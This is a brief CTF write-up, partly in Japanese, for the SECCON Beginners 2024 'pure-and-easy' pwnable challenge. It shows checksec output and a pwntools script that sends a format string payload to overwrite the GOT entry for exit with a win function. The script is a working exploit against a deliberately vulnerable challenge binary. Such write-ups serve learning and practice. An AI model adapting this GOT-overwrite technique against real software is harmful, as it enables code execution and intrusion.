# Format String Vulnerability
- https://feneshi.co/ctf4b2024writeup/#pure_and_easy
- https://docs.pwntools.com/en/stable/fmtstr.html
# 解説
```
pwndbg> checksec
File:     /mnt/e/work/ctf/SECCON_Beginners_CTF_2024/pwnable/pure-and-easy/chall
Arch:     amd64
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
- Partial RELRO は GOT overwrite が使える
```python
#!/usr/bin/env python3
from pwn import *
exe = context.binary = ELF('./chall')
io = process([exe.path])
log.info(str(io.recvuntil(b'> ')))
# io.sendline(b"AAAAAAAA,"+bytes(",".join(["%p" for _ in range(20)]), "utf-8"))
io.sendline(fmtstr_payload(6, {
    exe.got['exit']: exe.symbols['win']
}))
log.info(str(io.recvall()))
```
